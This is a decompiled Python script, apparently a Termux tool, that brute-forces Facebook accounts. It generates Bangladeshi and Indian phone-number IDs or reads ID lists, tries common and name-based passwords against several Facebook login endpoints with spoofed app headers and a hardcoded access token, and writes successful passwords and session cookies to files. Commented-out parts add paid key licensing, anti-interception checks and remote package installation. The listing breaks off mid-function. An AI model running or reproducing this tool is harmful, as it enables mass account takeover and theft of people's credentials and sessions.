""" Decompiled by Exotic Hridoy """

import subprocess
samsung = ['SM-G920F|NRD90M', 'SM-T535|LRX22G', 'SM-T231|KOT49H', 'SM-J320F|LMY47V', 'GT-I9190|KOT49H', 'GT-N7100|KOT49H', 'SM-T561|KTU84P', 'GT-N7100|KOT49H', 'GT-I9500|LRX22C', 'SM-J320F|LMY47V', 'SM-G930F|NRD90M', 'SM-J320F|LMY47V', 'SM-J510FN|NMF26X', 'GT-P5100|IML74K', 'SM-J320F|LMY47V', 'GT-N8000|JZO54K', 'SM-T531|LRX22G', 'SPH-L720|KOT49H', 'GT-I9500|JDQ39', 'SM-G935F|NRD90M', 'SM-T561|KTU84P', 'SM-T531|KOT49H', 'SM-J320FN|LMY47V', 'SM-A500F|MMB29M', 'SM-A500FU|MMB29M', 'SM-A500F|MMB29M', 'SM-T311|KOT49H', 'SM-T531|LRX22G', 'SM-J320F|LMY47V', 'SM-J320FN|LMY47V', 'SM-J320F|LMY47V', 'GT-P5210|KOT49H', 'SM-T230|KOT49H', 'GT-I9192|KOT49H', 'SM-T235|KOT4', 'GT-N7100|KOT49H', 'SM-A500F|LRX22G', 'SM-A500F|MMB29M', 'SM-G920F|MMB29K', 'SM-J510FN|NMF26X', 'GT-N8000|JZO54K', 'SM-A500H|MMB29M', 'GT-I9300|JSS15J', 'GT-I9500|LRX22C', 'SM-J320F|LMY4', 'SM-J510FN|NMF26X', 'SM-G930F|NRD90M', 'SM-J510FN|NMF26X', 'SM-T561|KTU84P', 'GT-N8000|KOT49H']

"""
def ___(command):
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    out, err = process.communicate()
___('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/SERVER')
___('rm -rf SPEED;git clone https://github.com/MUHIB-143/SPEED && cd SPEED')
___('mv SPEED /data/data/com.termux/files/usr/lib/python3.11/site-packages/SPEED')

try:
    from SPEED import speed
except:
    exit('  FACING SOME ISSUES CHECK YOUR INTERNET ')
___('rm -rf SERVER')
___('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/SERVER')

import os
os.system('pip uninstall requests -y;pip install requests')

def httpc():
    try:
        flist = os.listdir('/sdcard/Android/data/')
        if 'com.httpcanary.pro' in flist:
            print('\033[1;97m Don\'t Use Your Local Bypass System \n\033[1;97m  You\'r Using Httpconry App\n\033[1;97m  First Delete Httpconry App !')
            exit()
    except:
        return None
httpc()
"""

import os
import sys, re, platform, zlib, time
import random
import requests
import datetime
from datetime import datetime

cc = datetime.now()
cy = cc.year
cm = cc.month
cd = cc.day
ni = str(cy) + str(cm) + str(cd)
__update__ = requests.get('https://muhib-143.blogspot.com/2023/12/m4.html?m=1').text

vir = "2.0.1"

A1 = '\033[38;5;46m'
A2 = '\033[38;5;47m'
A3 = '\033[38;5;48m'
A4 = '\033[38;5;49m'
A5 = '\033[38;5;50m'
A6 = '\033[38;5;51m'

logo = f"""
{A1}   ██████  ██    ██ ██      ███████ ██   ██
{A2}  ██       ██    ██ ██      ██       ██ ██
{A3}  ██       ██    ██ ██      █████     ███
{A4}  ██       ██    ██ ██      ██       ██ ██
{A4}   ██████   ██████  ███████ ███████ ██   ██
{A6}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;44m\033[1;97m f \033[0m\033[1;92m MARUFUL HAQUE MUHIB\033[1;93m |\033[1;96m MUHIB-143\033[1;93m | \033[38;5;208mV\033[1;97m/\033[38;5;208m{vir}
{A6}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"""

def line():
    print(f'{A6}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━')

def clear():
    os.system('clear')
    print(logo)

"""
def __key__():
    myid = str(os.getuid())
    myid = myid.upper()[::-1]
    plat = re.findall('(\\d\\d)', myid)
    xp = ''.join(plat).replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
    return myid + xp[3:8]
key = ''.join(__key__())

try:
    httpCaht = requests.get('https://muhib-143.blogspot.com/2023/12/mrun.html?m=1').text
    keys = re.findall('##HELLO (.*) WORLD##', httpCaht)[0]
    os.system('rm -rf .key.txt')
    open('.key.txt', 'a').write(keys)
except:
    clear()
    print('\033[1;92m[\033[1;97m×\033[1;92m] FACING SOME INTERNET ISSUES ')
    exit()

def approval():
    oi = open('.key.txt', 'r').read()
    if key in oi:
        time_(oi)
        return
    clear()
    print('\033[1;92m[\033[1;97m×\033[1;92m] YOU ARE NOT APPROVED FOR USE THIS TOOL ')
    print(f'\033[1;92m[\033[1;97m×\033[1;92m] SEND \033[1;97m|\033[1;92m{key}\033[1;97m|\033[1;92m THIS KEY TO ADMIN  ')
    line()
    input('\033[1;92m[\033[1;97m×\033[1;92m] PRESS ENTER TO CONTACT ADMIN ')
    tks = 'ASSLAMUALAIKUM%20I%20!%20WANT%20TO%20BUY%20YOUR%20TOOL%20MY%20KEY%20:%20' + key
    os.system('am start https://wa.me/+8801640396972?text=' + tks)
    time.sleep(2)
    exit()
x = 0

def time_(oi):
    tie = oi.split(str(key) + '|')[1]
    nam = tie.split('|')[1]
    ex = tie.split('|')[0]
    os.system('rm -rf .new.txt')
    open('.new.txt', 'a').write(key + '|' + ex + '|' + nam)
    if ni < ex:
        try:
            open('/sdcard/Android/.if.txt', 'r').read().splitlines()
            __main__()
        except:
            if x < 1:
                clear()
                ty = str(input('\033[1;92m[\033[1;97m×\033[1;92m] PUT YOUR KEY HERE : '))
                if key in ty:
                    open('/sdcard/Android/.if.txt', 'a').write('$ANDROID')
                    __main__()
    else:
        clear()
        os.system('rm -rf /sdcard/Android/.if.txt')
        print('\033[1;92m[\033[1;97m×\033[1;92m] YOUR APPROVAL IS EXPIRED ')
        print('\033[1;92m[\033[1;97m×\033[1;92m] CONTACT ADMIN TO UPDATE YOUR APPROVAL ')
        exit()
"""

from os import path
from pathlib import Path
import base64
import zlib
import pip
import urllib
import time
import pip
import uuid

try:
    import requests
    import json
    import uuid
    import string
    from string import *
    from requests import api
    from concurrent.futures import ThreadPoolExecutor as tred
except ImportError:
    os.system('pip install requests futures==2 > /dev/null')
    os.system('python MUHIB.py')
folder_path = '/sdcard/MUHIB'

try:
    os.makedirs(folder_path, exist_ok=True)
except:
    pass

oks = []
cps = []
loop = 0
mthd = []
p = print
__update__ = requests.get('https://muhib-143.blogspot.com/2023/12/m4.html?m=1').text

import re

def extract_marker(update, marker_num):
    pattern = rf"M{marker_num}=(.*)=U{marker_num}"
    match = re.search(pattern, update)
    return match.group(1) if match else None

M1UA = extract_marker(__update__, 1)
M2UA = extract_marker(__update__, 2)
M3UA = extract_marker(__update__, 3)
M4UA = extract_marker(__update__, 4)
M5UA = extract_marker(__update__, 5)

def __main__():
    clear()
    p('\033[1;32m[\033[1;37mA\033[1;32m] \033[1;32mRANDOM \033[1;32m [\033[1;37mB\033[1;32m] FILE', end=' \033[1;97m:\033[1;92m ')
    ai = input()
    if ai in ['a', 'A', '1', '01']:
        rand()
    elif ai in ['b', 'B', '2', '02']:
        sexx()
    else:
        p(' ERROR CHOICE ')
        time.sleep(2)
        __main__()

def sexx():
    clear()
    print('\033[1;92m[\033[1;97m×\033[1;92m] EXAMPLE \033[1;97m:\033[1;92m \033[1;32m/sdcard/file.txt')
    line()
    file = input('\033[1;92m[\033[1;97m×\033[1;92m] PUT FILE PATH \033[1;97m:\033[1;92m ')
    try:
        fo = open(file, 'r').read().splitlines()
    except FileNotFoundError:
        line()
        print('\033[1;92m[\033[1;97m×\033[1;92m] File location not found ')
        time.sleep(2)
        sexx()
    clear()
    p('\033[1;32m[\033[1;37m×\033[1;32m] \033[1;32mMETHOD\"S \033[1;32m\033[1;97m:\033[1;92m \033[1;97m[\033[1;92mM1\033[1;97m/\033[1;92mM2\033[1;97m/\033[1;92mM3\033[1;97m/\033[1;92mM4\033[1;97m]')
    line()
    methd = input('\033[1;92m[\033[1;97m×\033[1;92m] CHOOSE \033[1;97m:\033[1;92m ')
    plist = []
    clear()
    try:
        ps_limit = int(input('\033[1;92m[\033[1;97m×\033[1;92m] ENTER PASSWORD LIMIT \033[1;97m:\033[1;92m '))
    except:
        ps_limit = 1
    clear()
    print('\033[1;92m[\033[1;97m×\033[1;92m] EXAMPLE \033[1;97m:\033[1;92m first last \033[1;37m|\033[1;32m first123')
    line()
    for i in range(ps_limit):
        plist.append(input(f'\033[1;92m[\033[1;97m×\033[1;92m] PUT PASSWORD\033[1;32m [\033[1;37m{i+1}\033[1;32m]\033[1;32m \033[1;97m:\033[1;92m '))
    with tred(max_workers=30) as FILE:
        clear()
        tl = str(len(fo))
        print(f"\033[1;92m[\033[1;97m×\033[1;92m] TOTAL IDS \033[1;97m:\033[1;92m {tl} \033[1;37m| \033[1;92m[\033[1;37mM{methd}\033[1;32m] \033[1;97m| \033[5;32m{datetime.now().strftime('%I:%M.%p')}")
        print('\033[1;92m[\033[1;97m×\033[1;92m] IF NO RESULT \033[1;97m[\033[1;93mOn\033[1;97m/\033[1;93mOff\033[1;97m]\033[1;92m AIRPLANE MODE ')
        line()
        for user in fo:
            ids, names = user.split('|')
            passlist = plist
            if methd in '1':
                FILE.submit(api1, ids, names, passlist)
            elif methd in '2':
                FILE.submit(api2, ids, names, passlist)
            elif methd in '3':
                FILE.submit(api3, ids, names, passlist)
            else:
                FILE.submit(api4, ids, names, passlist)
    print(' \n\033[1;32mCRACK COMPLETE\033[1;31m_________ ')
    print(f' _______\033[1;32mTOTAL OK ID :  \033[1;37m' + str(len(oks)))
    line()
    exit()

def api1(ids, names, passlist):
    global loop
    global oks
    try:
        sys.stdout.write(f'\r\r\033[1;37m[\033[1;32mMUHIB-M1\033[1;37m]-[\033[1;32m{loop}\033[1;37m]-\033[1;37m[\033[1;32mOK:{len(oks)}\033[1;37m]')
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
            fbbv = str(random.randint(0, 999999999))
            fbrv = str(random.randint(0, 999999999))
            fbsv = str(random.randint(4, 13)) + '.0'
            model, build = random.choice(samsung).split('|')
            uam = ' '.join(['[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)), '.0.0.' + str(random.randint(1111, 9999)), ';FBBV/' + str(random.randint(1111111, 9999999)), ';' + str(M1UA)])
            head = {'User-Agent': uam, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': '1', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'ES', 'client_country_code': 'authenticate', 'fb_api_req_friendly_name': '62f8ce9f74b12f84c123cc23437a4a32', 'api_key': accees_token, 'access_token': accees_token}
            po = requests.post('https://graph.facebook.com/auth/login', data=data, headers=head).json()
            if 'session_key' in po:
                uid = str(po['uid'])
                ckkk = ';'.join([i['name'] + '=' + i['value'] for i in po['session_cookies']])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                cookie = f'sb={ssbb};{ckkk}'
                print(f'\r\r\033[1;97m[\033[1;92mMUHIB-OK\033[1;97m]\033[1;32m ' + uid + f' | ' + pas)
                open('/sdcard/MUHIB/MUHIB-FILE-M1.txt', 'a').write(uid + '|' + pas + '|' + cookie + '\n')
                oks.append(uid)
                break
            if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                uid = str(po['error']['error_data']['uid'])
                cps.append(uid)
                break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        return None

def api2(ids, names, passlist):
    global loop
    global oks
    try:
        sys.stdout.write(f'\r\r\033[1;37m[\033[1;32mMUHIB-M2\033[1;37m]-[\033[1;32m{loop}\033[1;37m]-\033[1;37m[\033[1;32mOK:{len(oks)}\033[1;37m]')
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            uax = ' '.join(['[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)), '.0.0.' + str(random.randint(1111, 9999)), ';FBBV/' + str(random.randint(1111111, 9999999)), ';' + str(M2UA)])
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            data = {'adid': adid, 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': '8b59ed89-4b88-4f69-a1ed-dfea59e76839', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'auth.login': 'authenticate', 'fb_api_req_friendly_name': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'fb_api_caller_class': '882a8490361da98702bf97a021ddc14d'}
            headers = {'User-Agent': uax, 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': '706'}
            url = 'https://b-graph.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                coki = ';'.join([i['name'] + '=' + i['value'] for i in po['session_cookies']])
                print(f'\r\r\033[1;97m[\033[1;92mMUHIB-OK\033[1;97m]\033[1;32m ' + ids + f' | ' + pas)
                open('/sdcard/MUHIB/MUHIB-FILE-M2.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                oks.append(ids)
                break
            if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                open('/sdcard/MUHIB-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        return None

def api3(ids, names, passlist):
    global loop
    global oks
    try:
        sys.stdout.write(f'\r\r\033[1;37m[\033[1;32mMUHIB-M3\033[1;37m]-[\033[1;32m{loop}\033[1;37m]-\033[1;37m[\033[1;32mOK:{len(oks)}\033[1;37m]')
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            accees_token = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            fbav = f'{random.randint(111, 999)}.0.0.{random.randint(11, 99)}.{random.randint(111, 999)}'
            fbbv = str(random.randint(0, 999999999))
            fbrv = str(random.randint(0, 999999999))
            fbsv = str(random.randint(4, 13)) + '.0'
            model, build = random.choice(samsung).split('|')
            uam = ' '.join(['[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)), '.0.0.' + str(random.randint(1111, 9999)), ';FBBV/' + str(random.randint(1111111, 9999999)), ';' + str(M3UA)])
            head = {'User-Agent': uam, 'Accept-Encoding': 'gzip, deflate', 'Connection': 'close', 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'X-FB-Connection-Type': 'WIFI', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=62f8ce9f74b12f84c123cc23437a4a32', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': '62f8ce9f74b12f84c123cc23437a4a32'}
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': '1', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'ES', 'client_country_code': 'authenticate', 'fb_api_req_friendly_name': '62f8ce9f74b12f84c123cc23437a4a32', 'api_key': accees_token, 'access_token': accees_token}
            po = requests.post('https://api.facebook.com/auth/login', data=data, headers=head).json()
            if 'session_key' in po:
                uid = str(po['uid'])
                ckkk = ';'.join([i['name'] + '=' + i['value'] for i in po['session_cookies']])
                ssbb = base64.b64encode(os.urandom(18)).decode().replace('=', '').replace('+', '_').replace('/', '-')
                cookie = f'sb={ssbb};{ckkk}'
                print(f'\r\r\033[1;97m[\033[1;92mMUHIB-OK\033[1;97m]\033[1;32m ' + uid + f' | ' + pas)
                open('/sdcard/MUHIB/MUHIB-FILE-M3.txt', 'a').write(uid + '|' + pas + '|' + cookie + '\n')
                oks.append(uid)
                break
            if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                uid = str(po['error']['error_data']['uid'])
                cps.append(uid)
                break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        return None

def api4(ids, names, passlist):
    global loop
    global oks
    try:
        sys.stdout.write(f'\r\r\033[1;37m[\033[1;32mMUHIB-M4\033[1;37m]-[\033[1;32m{loop}\033[1;37m]-\033[1;37m[\033[1;32mOK:{len(oks)}\033[1;37m]')
        sys.stdout.flush()
        fn = names.split(' ')[0]
        try:
            ln = names.split(' ')[1]
        except:
            ln = fn
        for pw in passlist:
            pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
            uax = ' '.join(['[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)), '.0.0.' + str(random.randint(1111, 9999)), ';FBBV/' + str(random.randint(1111111, 9999999)), ';' + str(M4UA)])
            random_seed = random.Random()
            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
            data = {'adid': adid, 'format': 'json', 'device_id': str(uuid.uuid4()), 'cpl': 'true', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'device_based_login_password', 'error_detail_type': 'button_with_disabled', 'source': 'device_based_login', 'email': ids, 'password': pas, 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32', 'generate_session_cookies': '1', 'meta_inf_fbmeta': '', 'advertiser_id': '8b59ed89-4b88-4f69-a1ed-dfea59e76839', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'auth.login': 'authenticate', 'fb_api_req_friendly_name': 'com.facebook.account.login.protocol.Fb4aAuthHandler', 'fb_api_caller_class': '882a8490361da98702bf97a021ddc14d'}
            headers = {'User-Agent': uax, 'Content-Type': 'application/x-www-form-urlencoded', 'Host': 'graph.facebook.com', 'X-FB-Net-HNI': str(random.randint(20000, 40000)), 'X-FB-SIM-HNI': str(random.randint(20000, 40000)), 'X-FB-Connection-Type': 'MOBILE.LTE', 'X-Tigon-Is-Retry': 'False', 'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62', 'x-fb-device-group': '5120', 'X-FB-Friendly-Name': 'ViewerReactionsMutation', 'X-FB-Request-Analytics-Tags': 'graphservice', 'X-FB-HTTP-Engine': 'Liger', 'X-FB-Client-IP': 'True', 'X-FB-Server-Cluster': 'True', 'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62', 'Content-Length': '706'}
            url = 'https://b-api.facebook.com/auth/login'
            po = requests.post(url, data=data, headers=headers).json()
            if 'session_key' in po:
                coki = ';'.join([i['name'] + '=' + i['value'] for i in po['session_cookies']])
                print(f'\r\r\033[1;97m[\033[1;92mMUHIB-OK\033[1;97m]\033[1;32m ' + ids + f' | ' + pas)
                open('/sdcard/MUHIB/MUHIB-FILE-M4.txt', 'a').write(ids + '|' + pas + '|' + coki + '\n')
                oks.append(ids)
                break
            if 'www.facebook.com' in po.get('error', {}).get('message', ''):
                open('/sdcard/MUHIB-CP.txt', 'a').write(ids + '|' + pas + '\n')
                cps.append(ids)
                break
        loop += 1
    except requests.exceptions.ConnectionError:
        time.sleep(20)
    except Exception as e:
        return None

def rand():
    clear()
    p('\033[1;32m[\033[1;37mA\033[1;32m] \033[1;32mBANGLADESH \033[1;32m [\033[1;37mB\033[1;32m] INDIA ', end=' \033[1;97m:\033[1;92m ')
    bi = input()
    if bi in ['a', 'A', '1', '01']:
        rand_bd()
    elif bi in ['b', 'B', '2', '02']:
        rand_ind()
    else:
        p(' ERROR CHOICE ')
        time.sleep(2)
        __main__()

def rand_bd():
    user = []
    twf = []
    os.getuid
    os.geteuid
    clear()
    p('\033[1;32m[\033[1;37m×\033[1;32m] \033[1;32mCODE\"S \033[1;32m\033[1;97m:\033[1;92m \033[1;97m[\033[1;92m016\033[1;97m/\033[1;92m019\033[1;97m/\033[1;92m018\033[1;97m/\033[1;92m017\033[1;97m]', end=' \033[1;97m:\033[1;92m ')
    code = input()
    if not code:
        code = '017'
    p('\033[1;32m[\033[1;37m×\033[1;32m] \033[1;32mLIMIT\"S \033[1;32m\033[1;97m:\033[1;92m \033[1;97m[\033[1;92m1111\033[1;97m/\033[1;92m3000\033[1;97m/\033[1;92m5000\033[1;97m]', end=' \033[1;97m:\033[1;92m ')
    try:
        limit = int(input())
    except:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with tred(max_workers=30) as culex:
        clear()
        tl = str(len(user))
        print(f"\033[1;92m[\033[1;97m×\033[1;92m] TOTAL IDS \033[1;97m:\033[1;92m {tl} \033[1;37m|  \033[1;92m{code}  \033[1;97m| \033[5;32m{datetime.now().strftime('%I:%M.%p')}")
        print('\033[1;92m[\033[1;97m×\033[1;92m] IF NO RESULT \033[1;97m[\033[1;93mOn\033[1;97m/\033[1;93mOff\033[1;97m]\033[1;92m AIRPLANE MODE ')
        line()
        for love in user:
            pwx = [love[2:], love, code + love, code + love[:3], 'bangladesh', 'free fire', 'i love you', '708090', '203040', '506070', 'ayesha', 'Bangladesh', 'jannat', 'Free Fire', 'bangla', 'valobashi', 'password', 'sumaiya', 'ff lover', 'ronaldo', 'btsarmy', 'jannatul', 'humaira', 'hotgirl', 'cutegirl']
            ids = code + love
            culex.submit(FIRE, ids, pwx, tl)
    print(' \n\033[1;32mCRACK COMPLETE\033[1;31m_________ ')
    print(f' _______\033[1;32mTOTAL OK ID :  \033[1;37m' + str(len(oks)))
    line()
    exit()

def rand_ind():
    user = []
    twf = []
    os.getuid
    os.geteuid
    clear()
    p('\033[1;32m[\033[1;37m×\033[1;32m] \033[1;32mCODE\"S \033[1;32m\033[1;97m:\033[1;92m \033[1;97m[\033[1;92m632\033[1;97m/\033[1;92m739\033[1;97m/\033[1;92m933\033[1;97m/\033[1;92m723\033[1;97m]', end=' \033[1;97m:\033[1;92m ')
    code = input()
    if not code:
        code = '632'
    p('\033[1;32m[\033[1;37m×\033[1;32m] \033[1;32mLIMIT\"S \033[1;32m\033[1;97m:\033[1;92m \033[1;97m[\033[1;92m1111\033[1;97m/\033[1;92m3000\033[1;97m/\033[1;92m5000\033[1;97m]', end=' \033[1;97m:\033[1;92m ')
    try:
        limit = int(input())
    except:
        limit = 5000
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        user.append(nmp)
    with tred(max_workers=30) as culex:
        clear()
        tl = str(len(user))
        print(f"\033[1;92m[\033[1;97m×\033[1;92m] TOTAL IDS \033[1;97m:\033[1;92m {tl} \033[1;37m|  \033[1;92m{code}  \033[1;97m| \033[5;32m{datetime.now().strftime('%I:%M.%p')}")
        print('\033[1;92m[\033[1;97m×\033[1;92m] IF NO RESULT \033[1;97m[\033[1;93mOn\033[1;97m/\033[1;93mOff\033[1;97m]\033[1;92m AIRPLANE MODE ')
        line()
        for love in user:
            pwx = [love[2:], love, code + love, code + love, '57273200', '59039200', '57575751', '57575752', 'sangma', 'indian']
            ids = '+91' + code + love
            culex.submit(FIRE, ids, pwx, tl)
    print(' \n\033[1;32mCRACK COMPLETE\033[1;31m_________ ')
    print(f' _______\033[1;32mTOTAL OK ID :  \033[1;37m' + str(len(oks)))
    line()
    exit()

def FIRE(ids, pwv, tl):
    global loop
    global oks
    sys.stdout.write(f'\r\r\033[1;37m[\033[1;32mMUHIB-¼³\033[1;37m]-[\033[1;32m{loop}\033[1;37m]-\033[1;37m[\033[1;32mOK:{len(oks)}\033[1;37m]')
    sys.stdout.flush()
    try:
        for pas in pwv:
            application_version = str(random.randint(111, 555)) + '.0.0.' + str(random.randrange(9, 49)) + str(random.randint(111, 555))
            application_version_code = str(random.randint(0, 999999999))
            fbs = random.choice(['com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite'])
            gtt = random.choice(['GT-I9190', 'KOT49H', 'GT-I9192', 'KOT49H', 'GT-I9300I', 'KTU84P', 'GT-I9300', 'IMM76D', 'GT-I9300', 'JSS15J', 'GT-I9301I', 'KOT4', 'GT-I9301I', 'KOT49H', 'GT-I9500', 'JDQ39', 'GT-I9500', 'LRX22C', 'GT-N5100', 'JZO54K', 'GT-N7100', 'KOT49H', 'GT-N8000', 'JZO54K', 'GT-N8000', 'KOT49H', 'GT-P3110', 'JZO54K', 'GT-P5100', 'IML74K', 'GT-P5100', 'JDQ', 'KOT49H', 'GT-P5210', 'GT-P5220', 'JDQ39', 'GT-P5100', 'GT-S7390', 'JZO54K', 'SAMSUNG', 'SM-A500F', 'SAMSUNG', 'SM-G532F', 'SM-G920F', 'SAMSUNG', 'SM-J320F', 'SM-J510FN', 'SM-N920S', 'SAMSUNG'])
            android_version = str(random.randrange(6, 13))
            uam = ' '.join(['[FBAN/FB4A;FBAV/' + str(random.randint(11, 99)), '.0.0.' + str(random.randint(1111, 9999)), ';FBBV/' + str(random.randint(1111111, 9999999)), ';' + str(M5UA)])
            adid = str(uuid.uuid4())
            data = {'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'GB', 'client_country_code': 'GT-7245', 'fb_api_req_friendly_name': 'GT-7303'}
